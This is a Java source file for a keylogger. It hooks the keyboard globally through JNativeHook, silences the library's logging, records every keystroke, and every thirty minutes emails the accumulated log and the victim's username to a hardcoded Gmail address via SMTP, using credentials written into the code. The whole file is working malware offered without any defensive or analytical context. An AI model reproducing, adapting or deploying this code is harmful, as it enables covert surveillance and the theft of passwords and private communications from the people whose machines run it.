package keyboardlistener;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.util.Date;
import javax.swing.JOptionPane;
import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.logging.Logger;
import java.util.logging.Level;

public class Escucha implements NativeKeyListener {

    String registro;
    long inicio;
    final int intervaloGuardado = 30 * 60000;
    String user = "Jy8qG3fWGE@gmail.com";
    String password = "sbreaOyCKl";

    public Escucha() {
        registro = "";
        inicio = System.currentTimeMillis();

    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("No Definido") || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Desconocido keyCode: 0xe36")) {
            registro += "Shift ";
        } else {
            registro += NativeKeyEvent.getKeyText(e.getKeyCode()) + " ";
        }
        verificarLongitud();
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    public void iniciarEscucha() {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            JOptionPane.showMessageDialog(null, "No se pudo poner el gancho nativo. RIP");
            guardarRegistro(inicio);
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new Escucha());

    }

    public void verificarLongitud() {
        long msRegistro = inicio;
        if (System.currentTimeMillis() > (inicio + intervaloGuardado)) {
            guardarRegistro(msRegistro);
            inicio = System.currentTimeMillis();
        }

    }

    public void guardarRegistro(long nombre) {
        Date fecha = new Date();
        String mail = System.getProperty("user.name") + fecha.toString() + "\nSave interval: " + intervaloGuardado + "ms\n" + "\n" + registro;
        Properties props = new Properties();
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class",
                "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "465");

        Session session = Session.getDefaultInstance(props,
                new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(user, password);
            }
        });

        try {

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress("Jy8qG3fWGE@gmail.com"));
            message.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse("Jy8qG3fWGE@gmail.com"));
            message.setSubject(System.getProperty("user.name"));
            message.setText(mail);

            Transport.send(message);
            mail = registro = "";
        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }
    }
}
